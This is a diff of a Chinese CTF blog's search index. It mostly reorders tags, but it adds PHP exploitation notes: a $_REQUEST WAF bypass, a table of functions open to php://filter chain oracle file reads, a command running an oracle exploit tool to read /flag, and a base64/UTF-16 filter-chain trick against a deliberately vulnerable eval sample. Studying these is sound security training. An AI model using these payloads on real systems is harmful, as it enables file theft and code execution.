@@ -1571,8 +1571,8 @@
       </categories>
       <tags>
         <tag>wp</tag>
-        <tag>2023</tag>
         <tag>ciscn</tag>
+        <tag>2023</tag>
       </tags>
   </entry>
   <entry>
@@ -1663,8 +1663,8 @@
         <category>awd</category>
       </categories>
       <tags>
-        <tag>总结</tag>
         <tag>awd</tag>
+        <tag>总结</tag>
       </tags>
   </entry>
   <entry>
@@ -1807,8 +1807,8 @@
       </categories>
       <tags>
         <tag>wp</tag>
-        <tag>宁波</tag>
         <tag>2023</tag>
+        <tag>宁波</tag>
       </tags>
   </entry>
   <entry>
@@ -2267,7 +2267,7 @@
 <p><img src="https://github.com/dr0n1/auto_deploy/blob/main/auto_deploy.gif?raw=true"></p>
 <h1 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h1><p>V1.0: 第一代脚本<br>V1.1: 增加 python 安装模块<br>V1.2: 优化安装逻辑等<br>V1.3：移除 python，新增 golang 和 java<br>V2.1：增加 CTF-Misc 部分工具的安装<br>V2.2：优化可重复运行脚本逻辑<br>V2.3：优化部分 python 模块安装逻辑<br>V2.4：增加部分misc工具，格式化代码<br>V3.1：移除了centos的工具支持，增加golang多版本支持等</p>
 <h1 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h1><p>1：计划增加 web 系列工具</p>
-<p>有疑问或者有更好的建议请联系<a href="mailto:&#49;&#57;&#x33;&#x30;&#x37;&#55;&#x34;&#x33;&#x37;&#52;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#109;">&#49;&#57;&#x33;&#x30;&#x37;&#55;&#x34;&#x33;&#x37;&#52;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#109;</a></p>
+<p>有疑问或者有更好的建议请联系<a href="mailto:&#49;&#x39;&#x33;&#48;&#55;&#55;&#52;&#x33;&#55;&#x34;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#x6d;">&#49;&#x39;&#x33;&#48;&#55;&#55;&#52;&#x33;&#55;&#x34;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#x6d;</a></p>
 ]]></content>
       <categories>
         <category>项目</category>
@@ -2811,8 +2811,8 @@
         <category>总结</category>
       </categories>
       <tags>
-        <tag>php</tag>
         <tag>总结</tag>
+        <tag>php</tag>
         <tag>反序列化</tag>
       </tags>
   </entry>
@@ -3475,10 +3475,10 @@
         <category>wp</category>
       </categories>
       <tags>
-        <tag>wp</tag>
-        <tag>台州</tag>
-        <tag>2022</tag>
         <tag>awd</tag>
+        <tag>wp</tag>
+        <tag>2022</tag>
+        <tag>台州</tag>
       </tags>
   </entry>
   <entry>
@@ -3942,14 +3942,19 @@
 
 <p>直接构造<code>class@anonymous%00/var/www/html/flag.php:7$0</code>即可</p>
 <p>或者直接<code>echo urlencode(get_class($a));</code>输出</p>
+<h1 id="REQUEST的优先级"><a href="#REQUEST的优先级" class="headerlink" title="REQUEST的优先级"></a>REQUEST的优先级</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$str</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;waf&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_REQUEST</span>);<br></code></pre></td></tr></table></figure>
+
+<p>会同时接收post和get，但优先接收post的参数</p>
+<p>所以post发送同名参数后get可以绕过</p>
+<h1 id="一些替换"><a href="#一些替换" class="headerlink" title="一些替换"></a>一些替换</h1><p>localhost可以代替&#x2F;进行绕过</p>
 <h1 id="php函数小记"><a href="#php函数小记" class="headerlink" title="php函数小记"></a>php函数小记</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">implode</span>() — 把数组元素组合为一个字符串<br></code></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>php</category>
       </categories>
       <tags>
+        <tag>总结</tag>
         <tag>php</tag>
         <tag>trick</tag>
-        <tag>总结</tag>
       </tags>
   </entry>
   <entry>
@@ -5490,22 +5495,118 @@
 <h2 id="侧信道读取文件-基于错误的oracle方式（error-based-oracle）"><a href="#侧信道读取文件-基于错误的oracle方式（error-based-oracle）" class="headerlink" title="侧信道读取文件-基于错误的oracle方式（error-based-oracle）"></a>侧信道读取文件-基于错误的oracle方式（error-based-oracle）</h2><p>与 FilterChain 利用相似</p>
 <p>限制条件：<br>1：php 5.3 以下不能用<br>2：极度依赖系统 iconv 提供的字符集</p>
 <p>例子</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure>
-
 <figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//2024红明谷</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><a href="https://tttang.com/archive/1755">The End of AFR?</a> 非常详细的解读了工作原理</p>
 <blockquote>
 <p>使用 UCS-4LE 等编码技巧让 PHP 产生内存错误导致服务器产生 500 错误，配合 dechunk 编码使得前面的错误正常化从而获得一个盲注的判断依据，使用该依据以及编码技巧逐个判断盲注出文件内容，进而可以造成任意文件内容读取。</p>
 </blockquote>
+<h3 id="受影响的函数"><a href="#受影响的函数" class="headerlink" title="受影响的函数"></a>受影响的函数</h3><p>基本上只要对文件执行操作，包括读取、写入或向文件追加内容，或者使用了链接到该文件的流都会受到影响</p>
+<table>
+<thead>
+<tr>
+<th>Function</th>
+<th>Pattern</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file_get_contents</td>
+<td>file_get_contents($_POST[0]);</td>
+</tr>
+<tr>
+<td>readfile</td>
+<td>readfile($_POST[0]);</td>
+</tr>
+<tr>
+<td>finfo-&gt;file</td>
+<td>$file &#x3D; new finfo(); $fileinfo &#x3D; $file-&gt;file($_POST[0], FILEINFO_MIME);</td>
+</tr>
+<tr>
+<td>getimagesize</td>
+<td>getimagesize($_POST[0]);</td>
+</tr>
+<tr>
+<td>md5_file</td>
+<td>md5_file($_POST[0]);</td>
+</tr>
+<tr>
+<td>sha1_file</td>
+<td>sha1_file($_POST[0]);</td>
+</tr>
+<tr>
+<td>hash_file</td>
+<td>hash_file(‘md5’, $_POST[0]);</td>
+</tr>
+<tr>
+<td>file</td>
+<td>file($_POST[0]);</td>
+</tr>
+<tr>
+<td>parse_ini_file</td>
+<td>parse_ini_file($_POST[0]);</td>
+</tr>
+<tr>
+<td>copy</td>
+<td>copy($_POST[0], ‘&#x2F;tmp&#x2F;test’);</td>
+</tr>
+<tr>
+<td>file_put_contents (only target read only with this)</td>
+<td>file_put_contents($_POST[0], “”);</td>
+</tr>
+<tr>
+<td>stream_get_contents</td>
+<td>$file &#x3D; fopen($_POST[0], “r”); stream_get_contents($file);</td>
+</tr>
+<tr>
+<td>fgets</td>
+<td>$file &#x3D; fopen($_POST[0], “r”); fgets($file);</td>
+</tr>
+<tr>
+<td>fread</td>
+<td>$file &#x3D; fopen($_POST[0], “r”); fread($file, 10000);</td>
+</tr>
+<tr>
+<td>fgetc</td>
+<td>$file &#x3D; fopen($_POST[0], “r”); fgetc($file);</td>
+</tr>
+<tr>
+<td>fgetcsv</td>
+<td>$file &#x3D; fopen($_POST[0], “r”); fgetcsv($file, 1000, “,”);</td>
+</tr>
+<tr>
+<td>fpassthru</td>
+<td>$file &#x3D; fopen($_POST[0], “r”); fpassthru($file);</td>
+</tr>
+<tr>
+<td>fputs</td>
+<td>$file &#x3D; fopen($_POST[0], “rw”); fputs($file, 0);</td>
+</tr>
+</tbody></table>
 <h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p><a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">php_filter_chains_oracle_exploit</a></p>
 <p><code>python3 filters_chain_oracle_exploit.py --target http://172.20.35.66/ --parameter 0 --file /flag</code></p>
 <p><img src="/img/summary/file_include-16.png"></p>
+<h2 id="伪协议去除多余字符"><a href="#伪协议去除多余字符" class="headerlink" title="伪协议去除多余字符"></a>伪协议去除多余字符</h2><p>例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;lajilajilajilajilaji&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>].<span class="hljs-string">&#x27;lajilajilajilajilaji&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&quot;.txt&quot;</span>,<span class="hljs-variable">$content</span>);<br><br><span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;123.txt&#x27;</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]));<br></code></pre></td></tr></table></figure>
+
+<p>原理还是基于base64的宽松性</p>
+<p>所以只需要将垃圾字符转换成base64字符集以外的字符即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> =<span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;utf-16&#x27;</span>, <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$payload</span>);<br><br><span class="hljs-comment">// 1：我们需要的数据</span><br><span class="hljs-comment">// system</span><br><br><span class="hljs-comment">// 2：base64后</span><br><span class="hljs-comment">// c3lzdGVt</span><br><br><span class="hljs-comment">// 3：utf-8转换为utf-16</span><br><span class="hljs-comment">// %FF%FEc%003%00l%00z%00d%00G%00V%00t%00</span><br></code></pre></td></tr></table></figure>
+
+
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;lajilajilajilajilaji%FF%FEc%003%00l%00z%00d%00G%00V%00t%00lajilajilajilajilaji&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;utf-16&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$payload</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>;<br><br><span class="hljs-comment">// 1：拼接后的数据</span><br><span class="hljs-comment">// lajilajilajilajilaji%FF%FEc%003%00l%00z%00d%00G%00V%00t%00lajilajilajilajilaji</span><br><br><span class="hljs-comment">// 2：utf-16转换为utf-8</span><br><span class="hljs-comment">// 乱码c3lzdGVt乱码</span><br><br><span class="hljs-comment">// 3：base64_decode</span><br><span class="hljs-comment">// system</span><br></code></pre></td></tr></table></figure>
+
+<p>转成伪协议的写法</p>
+<p><code>php://filter/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=</code></p>
+<p>不同编码<a href="https://www.novel.tools/decode">在线转换网站</a></p>
+<p>php还有很多支持的字符编码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">UCS-<span class="hljs-number">4</span>*<br>UCS-<span class="hljs-number">4</span>BE<br>UCS-<span class="hljs-number">4</span>LE*<br>UCS-<span class="hljs-number">2</span><br>UCS-<span class="hljs-number">2</span>BE<br>UCS-<span class="hljs-number">2</span>LE<br>UTF-<span class="hljs-number">32</span>*<br>UTF-<span class="hljs-number">32</span>BE*<br>UTF-<span class="hljs-number">32</span>LE*<br>UTF-<span class="hljs-number">16</span>*<br>UTF-<span class="hljs-number">16</span>BE*<br>UTF-<span class="hljs-number">16</span>LE*<br>UTF-<span class="hljs-number">7</span><br>UTF7-IMAP<br>UTF-<span class="hljs-number">8</span>*<br>ASCII*<br>EUC-JP*<br>SJIS*<br>eucJP-win*<br>SJIS-win*<br>ISO-<span class="hljs-number">2022</span>-JP<br>ISO-<span class="hljs-number">2022</span>-JP-MS<br>CP932<br>CP51932<br>SJIS-mac（别名：MacJapanese）<br>SJIS-Mobile<span class="hljs-comment">#DOCOMO（别名：SJIS-DOCOMO）</span><br>SJIS-Mobile<span class="hljs-comment">#KDDI（别名：SJIS-KDDI）</span><br>SJIS-Mobile<span class="hljs-comment">#SOFTBANK（别名：SJIS-SOFTBANK）</span><br>UTF-<span class="hljs-number">8</span>-Mobile<span class="hljs-comment">#DOCOMO（别名：UTF-8-DOCOMO）</span><br>UTF-<span class="hljs-number">8</span>-Mobile<span class="hljs-comment">#KDDI-A</span><br>UTF-<span class="hljs-number">8</span>-Mobile<span class="hljs-comment">#KDDI-B（别名：UTF-8-KDDI）</span><br>UTF-<span class="hljs-number">8</span>-Mobile<span class="hljs-comment">#SOFTBANK（别名：UTF-8-SOFTBANK）</span><br>ISO-<span class="hljs-number">2022</span>-JP-MOBILE<span class="hljs-comment">#KDDI（别名：ISO-2022-JP-KDDI）</span><br>JIS<br>JIS-ms<br>CP50220<br>CP50220raw<br>CP50221<br>CP50222<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>*<br>byte2be<br>byte2le<br>byte4be<br>byte4le<br>BASE64<br>HTML-ENTITIES（别名：HTML）<br><span class="hljs-number">7</span>bit<br><span class="hljs-number">8</span>bit<br>EUC-CN*<br>CP936<br>GB18030<br>HZ<br>EUC-TW*<br>CP950<br>BIG-<span class="hljs-number">5</span>*<br>EUC-KR*<br>UHC（别名：CP949）<br>ISO-<span class="hljs-number">2022</span>-KR<br>Windows-<span class="hljs-number">1251</span>（别名：CP1251）<br>Windows-<span class="hljs-number">1252</span>（别名：CP1252）<br>CP866（别名：IBM866）<br>KOI8-R*<br>KOI8-U*<br>ArmSCII-<span class="hljs-number">8</span>（别名：ArmSCII8）<br></code></pre></td></tr></table></figure>
+
+
 <h1 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h1><p>远程文件包含（Remote File Inclusion， RFI）是指包含远程服务器上的文件，需要在<code>php.ini</code>中设置<code>allow_url_include=On</code></p>
 <p>远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。</p>
 <p>如果过滤了点可以将<code>ip</code>转为<code>int</code></p>
 <p><img src="/img/summary/file_include-4.png"></p>
-<p>参考文章1：<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述</a><br>参考文章2：<a href="http://www.gem-love.com/2022/06/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8D%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/">文件包含的几种不常规利用姿势</a></p>
+<p>参考文章1：<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP裸文件本地包含综述</a><br>参考文章2：<a href="http://www.gem-love.com/2022/06/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8D%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/">文件包含的几种不常规利用姿势</a><br>参考文章3：<a href="https://xz.aliyun.com/t/12939">PHP Filter链——基于oracle的文件读取攻击</a></p>
 ]]></content>
       <categories>
         <category>总结</category>
@@ -5573,8 +5674,8 @@
       </categories>
       <tags>
         <tag>wp</tag>
-        <tag>2021</tag>
         <tag>金砖</tag>
+        <tag>2021</tag>
       </tags>
   </entry>
   <entry>
@@ -5776,8 +5877,8 @@
         <category>项目</category>
       </categories>
       <tags>
-        <tag>misc</tag>
         <tag>docker</tag>
+        <tag>misc</tag>
         <tag>ctfd</tag>
         <tag>pwn</tag>
         <tag>web</tag>
@@ -6223,8 +6324,8 @@
       </categories>
       <tags>
         <tag>wp</tag>
-        <tag>nuaa</tag>
         <tag>2021</tag>
+        <tag>nuaa</tag>
       </tags>
   </entry>
   <entry>
@@ -6556,8 +6657,8 @@
       <tags>
         <tag>wp</tag>
         <tag>2021</tag>
-        <tag>ssrf</tag>
         <tag>极客挑战</tag>
+        <tag>ssrf</tag>
       </tags>
   </entry>
   <entry>
@@ -6594,8 +6695,8 @@
       <tags>
         <tag>wp</tag>
         <tag>2021</tag>
-        <tag>极客挑战</tag>
         <tag>disable_function</tag>
+        <tag>极客挑战</tag>
       </tags>
   </entry>
   <entry>
@@ -6788,8 +6889,8 @@
         <category>awd</category>
       </categories>
       <tags>
-        <tag>docker</tag>
         <tag>awd</tag>
+        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
